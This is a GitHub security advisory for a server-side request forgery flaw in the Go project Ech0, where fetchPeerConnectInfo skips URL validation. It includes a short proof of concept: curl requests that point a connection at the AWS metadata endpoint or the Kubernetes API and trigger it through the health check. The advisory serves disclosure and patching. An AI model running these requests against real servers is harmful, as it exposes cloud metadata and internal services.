# [H] Ech0 has Server-Side Request Forgery (SSRF) via Connect Handler fetchPeerConnectInfo

## Summary
Severity: High
Advisory: GHSA-8mc6-xjpr-h98x
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-8mc6-xjpr-h98x
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <1.4.8-0.20260503040602-091d26d2d942

## Details
## Summary
The `fetchPeerConnectInfo` function in `internal/service/connect/connect.go:214-239` uses `httpUtil.SendRequest` (no SSRF protection) instead of `SendSafeRequest` (which has `ValidatePublicHTTPURL` with private IP blocking). This allows authenticated users to make the server request arbitrary URLs including internal/cloud metadata endpoints.

## Details
In `internal/service/connect/connect.go`, the `fetchPeerConnectInfo` function:
```go
func fetchPeerConnectInfo(peerConnectURL string, requestTimeout time.Duration) (model.Connect, error) {
    url := httpUtil.TrimURL(peerConnectURL) + "/api/connect"
    resp, err := httpUtil.SendRequest(url, "GET", struct {...}{...}, requestTimeout)
```

This uses `SendRequest` which has NO URL validation. The codebase HAS `SendSafeRequest` at `internal/util/http/http.go:228-281` with proper SSRF protection, but `fetchPeerConnectInfo` does not use it.

Called from:
- Line 307: `data, err := fetchPeerConnectInfo(conn.ConnectURL, requestTimeout)`
- - Line 498: `data, err := fetchPeerConnectInfo(conn.ConnectURL, healthProbeTimeout)`
## PoC
```bash
# 1. Add a connection pointing to AWS metadata service
curl -X POST "https://ech0.example.com/api/connects" \
  -H "Authorization: Bearer <token>" \
  -d '{"connect_url": "http://169.254.169.254/latest/meta-data/instance-id"}'

# 2. Trigger SSRF via health check
curl -H "Authorization: Bearer <token>" \
  "https://ech0.example.com/api/connects/health"
# Returns AWS EC2 instance ID
```

Or for Kubernetes:
```bash
curl -X POST "https://ech0.example.com/api/connects" \
  -H "Authorization: Bearer <token>" \
  -d '{"connect_url": "http://kubernetes.default.svc.cluster.local:443/api"}'
```

## Impact
- **Confidentiality**: SSRF can access internal services, cloud metadata (AWS IMDSv1, GCE metadata), Kubernetes API
- - **CWE-918**: Server-Side Request Forgery

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-8mc6-xjpr-h98x
- https://github.com/lin-snow/Ech0/commit/091d26d2d942df6df9f520328d2f9cf2592bbefc
- https://github.com/lin-snow/Ech0
